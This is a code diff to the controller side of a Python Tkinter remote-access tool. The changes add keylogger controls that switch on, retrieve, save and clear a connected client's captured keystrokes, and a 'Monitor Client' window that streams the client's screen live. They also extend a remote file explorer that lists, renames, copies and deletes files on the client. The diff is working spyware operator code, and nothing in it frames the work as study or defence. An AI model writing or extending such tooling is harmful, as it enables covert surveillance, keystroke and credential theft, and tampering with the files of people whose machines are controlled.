@@ -8,6 +8,8 @@ import pickle
 import os
 import mss.tools
 import ssl
+import cv2
+import numpy as np
 
 
 class App():
@@ -28,33 +30,27 @@ class App():
         self.selected_client = ['', '']
         self.socket = None
         self.client = None
-        self.pinging = False
+        self.comm_occuped = False
         self.id = ''
         self.client_addr = ()
     
         self.menu_bar = tk.Menu(self.root)
 
         self.filemenu = tk.Menu(self.menu_bar, tearoff=0)
-        #self.filemenu.add_command(label='New Connection', command=self.conn_manager)
         self.filemenu.add_command(label='Manage Connections', command=lambda: threading.Thread(target=self.conn_manager, daemon=True).start())
         self.menu_bar.add_cascade(label='Connection', menu=self.filemenu)
 
         self.tools_menu = tk.Menu(self.menu_bar, tearoff=0)
         self.tools_menu.add_command(label='File Explorer', command=lambda: threading.Thread(target=self.file_explorer, daemon=True).start())
-        self.tools_menu.add_command(label='Dashboard')
-        
-        self.keyloggermenu = tk.Menu(self.tools_menu, tearoff=0)
-        self.keyloggermenu.add_command(label='On')
-        self.keyloggermenu.add_command(label='Off')
-        self.keyloggermenu.add_command(label='Save')
-
-        self.tools_menu.add_cascade(label='Keylogger', menu=self.keyloggermenu)
-        
+        self.tools_menu.add_command(label='Monitor Client', command=lambda: threading.Thread(target=self.monitor_client, daemon=True).start())
         self.menu_bar.add_cascade(label='Tools', menu=self.tools_menu)
-
-        self.terminalmenu = tk.Menu(self.menu_bar, tearoff=0)
-        self.terminalmenu.add_command(label='Clear Terminal')
-        self.menu_bar.add_cascade(label='Terminal', menu=self.terminalmenu)
+        
+        self.keyloggermenu = tk.Menu(self.menu_bar, tearoff=0)
+        self.keyloggermenu.add_command(label='On', command=self.keylogger_on)
+        self.keyloggermenu.add_command(label='Off', command=self.keylogger_off)
+        self.keyloggermenu.add_command(label='Save', command=self.keylogger_get)
+        self.keyloggermenu.add_command(label='Clear', command=self.keylogger_clear)
+        self.menu_bar.add_cascade(label='Keylogger', menu=self.keyloggermenu)
 
         self.logsmenu = tk.Menu(self.menu_bar, tearoff=0)
         self.logsmenu.add_command(label='Open Logs', command=self.log.open_)
@@ -67,6 +63,75 @@ class App():
 
     def run(self):
         self.root.mainloop()
+        
+    def keylogger_on(self):
+        command = pickle.dumps('keylogger on')
+        header, data = comm(self.client, f'COMMAND:{len(command)}:NONE', command)
+        if not 'ERROR' in header:
+            tk.messagebox.showinfo('Keylogger', 'Keylogger succesfully turned on.')
+        else:
+            tk.messagebox.showerror('Keylogger', 'Error while trying to turn on the keylogger.')
+
+    def keylogger_off(self):
+        command = pickle.dumps('keylogger off')
+        header, data = comm(self.client, f'COMMAND:{len(command)}:NONE', command)
+        if not 'ERROR' in header:
+            tk.messagebox.showinfo('Keylogger', 'Keylogger succesfully turned off.')
+        else:
+            tk.messagebox.showerror('Keylogger', 'Error while trying to turn off the keylogger.')
+    def keylogger_get(self):
+        command = pickle.dumps('keylogger get')
+        header, data = comm(self.client, f'COMMAND:{len(command)}:NONE', command)
+        error = False
+        name = f'ressources/keylogger/{time.time()}.txt'
+        try:
+            if not os.path.exists('ressources/keylogger/'):
+                os.makedirs('ressources/keylogger/')
+            with open(name, "w") as f:
+                f.write(str(data))
+        except Exception as e:
+            error = True
+            print(e)
+            
+        if not 'ERROR' in header and not error:
+            path = os.path.join(os.getcwd(), name).replace('\\', '/')
+            os.startfile(path)
+        else:
+            tk.messagebox.showerror('Keylogger', 'Error while trying to get keylogger content.')
+    
+    def keylogger_clear(self):
+        command = pickle.dumps('keylogger clear')
+        header, data = comm(self.client, f'COMMAND:{len(command)}:NONE', command)
+        if not 'ERROR' in header:
+            tk.messagebox.showinfo('Keylogger', 'Keylogger succesfully cleared.')
+        else:
+            tk.messagebox.showerror('Keylogger', 'Error while trying to clear the keylogger.')
+        
+    def monitor_client(self):
+        self.log.add('opened monitor app')
+        if self.client != None:
+            try:
+                while True:
+                    time0 = time.time()
+                    data = pickle.dumps('screenshot 0')
+                    header, img_bytes = comm(self.client, f'COMMAND:{len(data)}:NONE', data)
+                    if not 'ERROR' in header:
+                        img_array = np.frombuffer(img_bytes, dtype=np.uint8)
+                        img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
+                        cv2.imshow('Monitoring Client', img)
+                        
+                        key = cv2.waitKey(1)
+                        if cv2.getWindowProperty('Monitoring Client', cv2.WND_PROP_VISIBLE) < 1:
+                            break
+                    else:
+                        self.log.add(header)
+                        
+                    if time.time() - time0 < 1/30:
+                        time.sleep(1/30 - (time.time() - time0))
+            except Exception as e:
+                print('Error:', e)
+            finally:
+                cv2.destroyAllWindows()
         
     def file_explorer(self):
         if self.client != None:
@@ -114,18 +179,7 @@ class App():
                     
         if self.client == None:
             self.log.add('unable to connect to client')
-        else:
-            threading.Thread(target=self.ping, deamon=True).start()
             
-    def ping(self):
-        data = pickle.dumps("Pinged")
-        while True:
-            if self.client != None and self.socket != None:
-                self.pinging = True
-                header, data = comm(self.client, "PING:len(data):PING", data)
-                self.pinging = False
-                time.sleep(8)
-                
 class CMD():
     def __init__(self, root):
         self.root = root
@@ -214,14 +268,13 @@ class CMD():
                     except Exception as e:
                         self.text.insert(tk.END, '\nError !')
                         app.log.add(f'error while sending file in execute_command function : {e}')
-                        
+                       
                 thread = threading.Thread(target=self.communication, daemon=True, args=(data, ))
                 thread.start()
                 thread.join()
                 
                 header = self.output[0]
                 data = self.output[1]
-                app.log.add(f'received header : {header}')
                 header = header.split(':')
                 
                 if command == 'keylogger save':
@@ -236,11 +289,15 @@ class CMD():
                     self.text.insert(tk.END, '\nDone')
                     with open(f'ressources/received_files/{header[2]}', 'wb') as f:
                         f.write(data)
-                elif header[0] == 'MSS_IMG':
+                elif header[0] == 'IMG':
                     self.text.insert(tk.END, '\n' + header[2])
                     self.text.insert(tk.END, '\nDone')
                     name = f'ressources/received_screenshots/{time.time()}.png'
-                    mss.tools.to_png(data.rgb, data.size, output=name)
+                    with open('degug.jpg', 'wb') as f:
+                        f.write(data)
+                    img_array = np.frombuffer(data, dtype=np.uint8)
+                    img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
+                    cv2.imwrite(name, img)
                     
                 else:
                     app.log.add('mismatched type in header')
@@ -262,7 +319,7 @@ class CMD():
         
 class ConnMaker():
     def __init__(self):
-        app.log.add("opened connection manager ...")
+        app.log.add('opened connection manager ...')
         self.root = tk.Tk()
         self.root.title('Connection Manager')
         self.root.geometry('400x470')
@@ -277,7 +334,7 @@ class ConnMaker():
         
         tk.Label(self.root, text='Current Client : ').pack()
         tk.Label(self.root, text=str(app.client)).pack()
-        tk.Button(self.root, text="Close Client", command=self.close_client).pack()
+        tk.Button(self.root, text='Close Client', command=self.close_client).pack()
         
         ttk.Separator(self.root, orient='horizontal').pack(fill='x', pady=10)
 
@@ -291,7 +348,7 @@ class ConnMaker():
     def close_client(self):
         self.client = None
         try:
-            header, data = comm(app.client, "CLOSE:CLOSE:CLOSE", b"CLOSE")
+            header, data = comm(app.client, 'CLOSE:CLOSE:CLOSE', b'CLOSE')
             app.client.close()
             app.socket.close()
         except:
@@ -311,7 +368,7 @@ class ConnMaker():
             print(2, 'error !')
 
     def update_search(self):
-        app.log.add("update search running ...")
+        app.log.add('update search running ...')
         self.conn_list.delete(0, tk.END)
         self.clients = []
         self.ids = []
@@ -330,9 +387,10 @@ class ConnMaker():
                 data = ssock.recv(1024).decode()
                 time.sleep(0.1)
                 ssock.sendall(b'PINGED')
+                id_ = ssock.recv(1024).decode()
                 if (client_addr[0] not in self.clients) and data == 'IDLE':
                     self.clients.append(client_addr[0])
-                    self.ids.append(ssock.recv(1024).decode())
+                    self.ids.append(id_)
                 ssock.close()
             except Exception as e:
                 app.log.add(f'error while trying to connect to a potential client : {e}')
@@ -348,28 +406,35 @@ class ConnMaker():
 class FileExplorer():
     def __init__(self, root):
         self.root = root
-        self.create_widgets()
-
-    def create_widgets(self):
-        # Frame principale
+        
+        menubar = tk.Menu(self.root)
+        file_menu = tk.Menu(menubar, tearoff=0)
+        file_menu.add_command(label='🔄 Refresh', command=self.refresh_tree)
+        file_menu.add_command(label='❌ Close', command=self.root.quit)
+        menubar.add_cascade(label='File', menu=file_menu)
+        self.root.config(menu=menubar)
+    
         self.main_frame = tk.Frame(self.root)
         self.main_frame.pack(fill='both', expand=True)
-
+    
+        self.path_label = tk.Label(self.main_frame, text='Path : ', anchor='w')
+        self.path_label.pack(fill='x')
+    
         self.tree_frame = tk.Frame(self.main_frame)
         self.tree_frame.pack(fill='both', expand=True)
-
+    
         self.tree = ttk.Treeview(self.tree_frame)
         self.tree.pack(fill='both', expand=True, side='left')
-
+    
         scrollbar = ttk.Scrollbar(self.tree_frame, orient='vertical', command=self.tree.yview)
         scrollbar.pack(side='right', fill='y')
         self.tree.configure(yscrollcommand=scrollbar.set)
-
+    
         self.tree.bind('<<TreeviewOpen>>', self.on_open)
-        
+    
         self.context_menu = self.create_context_menu()
-        
-        self.tree.bind("<Button-3>", self.show_context_menu)
+    
+        self.tree.bind('<Button-3>', self.show_context_menu)
 
         try:
             self.add_drives()
@@ -377,6 +442,14 @@ class FileExplorer():
             print('dede', e)
             app.log.add(f'error in file explorer : {e}')
             
+    def refresh_tree(self):
+        selected = self.tree.focus()
+        if selected:
+            path = self.tree.item(selected, 'values')[0]
+            self.tree.delete(*self.tree.get_children(selected))
+            self.populate_node(selected, path)
+
+
     def show_context_menu(self, event):
         selected_item = self.tree.identify_row(event.y)
         if selected_item:
@@ -403,7 +476,7 @@ class FileExplorer():
             data = pickle.dumps(f'ls "{path}" ')
             header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
             for name in data:
-                abspath = os.path.join(path, name)
+                abspath = os.path.join(path.replace("\\", "/"), name).replace("\\", "/")
                 data = pickle.dumps(f'isdir "{abspath}"')
                 header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                 isdir = data
@@ -423,9 +496,11 @@ class FileExplorer():
                 self.tree.delete(first_child)
                 path = self.tree.item(selected, 'values')[0]
                 self.populate_node(selected, path)
+        path = self.tree.item(selected, 'values')[0]
+        self.path_label.config(text=f"Current Path: {path}")
         self.root.lift()
         self.root.focus_force()
-                
+
     def create_context_menu(self):
         context_menu = tk.Menu(self.root, tearoff=0)
         context_menu.add_command(label="Delete", command=self.delete_item)
@@ -468,14 +543,16 @@ class FileExplorer():
         selected_item = self.tree.selection()[0]
         old_name = self.tree.item(selected_item, 'values')[0]
         
-        new_name = tk.simpledialog.askstring("Rename", "Enter new name:", initialvalue=old_name)
+        new_name = tk.simpledialog.askstring("Rename", "Enter new name:", initialvalue=os.path.basename(old_name), parent=self.root)
         if new_name:
             try:
-
-                data = pickle.dumps(f'rename "{old_name}", "{new_name}"')
+                new_path = os.path.join(os.path.dirname(old_name), new_name).replace("\\", "/")
+                
+                data = pickle.dumps(f'rename "{old_name}" "{new_path}"')
                 header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                 
-                new_path = os.path.join(os.path.dirname(old_name), new_name)
+
+                print(new_path)
                 self.tree.item(selected_item, text=f"{new_name}", values=[new_path])
             except Exception as e:
                 tk.messagebox.showerror("Error", f"Failed to rename: {e}")
@@ -484,9 +561,9 @@ class FileExplorer():
         selected_item = self.tree.selection()[0]
         path = self.tree.item(selected_item, 'values')[0]
         
-        folder_name = tk.simpledialog.askstring("New Folder", "Enter folder name:")
+        folder_name = tk.simpledialog.askstring("New Folder", "Enter folder name:", parent=self.root)
         if folder_name:
-            new_folder_path = os.path.join(path, folder_name)
+            new_folder_path = os.path.join(path.replace("\\", "/"), folder_name).replace("\\", "/")
             try:
                 
                 data = pickle.dumps(f'makedirs "{new_folder_path}"')
@@ -510,7 +587,7 @@ class FileExplorer():
                 header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                 
                 if data:
-                    destination_path = os.path.join(destination_path, os.path.basename(self.copied_item))
+                    destination_path = os.path.join(destination_path.replace("\\", "/"), os.path.basename(self.copied_item)).replace("\\", "/")
                     
                     data = pickle.dumps(f'copydir "{self.copied_item}" "{destination_path}"')
                     header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
@@ -619,37 +696,39 @@ class Log():
             f.write('')
             
     def open_(self):
-        path = os.path.join(os.getcwd(), self.path)
+        path = os.path.join(os.getcwd().replace("\\", "/"), self.path).replace("\\", "/")
         os.startfile(path)
 
 
 def comm(client, header, data):
+    app.comm_occuped = True
     try:
-        while app.pinging and not "PING" in header:
-            print("waiting for server to finish pinging ...")
-            time.sleep(0.5)
         client.send(header.encode())
         client.sendall(data)
         
         header = client.recv(4096).decode()
         bytes_data = b''
-        while len(bytes_data) < int(header.split(':')[1]):
-            packet = client.recv(65536)
+        size = int(header.split(':')[1])
+        while len(bytes_data) < size:   
+            packet = client.recv(size - len(bytes_data)) #change to 65536 for stability
             if not packet:
                 break
             bytes_data += packet
-        data = pickle.loads(bytes_data)
+            
+        if header.split(":")[0] != "IMG":
+            data = pickle.loads(bytes_data)
+        else:
+            data = bytes_data
         
         app.log.add('received header and data in comm function')
-        if header[0] == "ERROR":
-            print(header)
         app.log.add(header)
-        if header[0] == "TEXT":
+        if header.split(":")[0] == "TEXT":
             app.log.add(data)
         return header, data
     except Exception as e:
         app.log.add(f'error in comm function : {e}')
         return 'ERROR:ERROR:ERROR', f'error while receiving data: {e}'
+    app.comm_occuped = False
     
 
 if __name__ == '__main__':
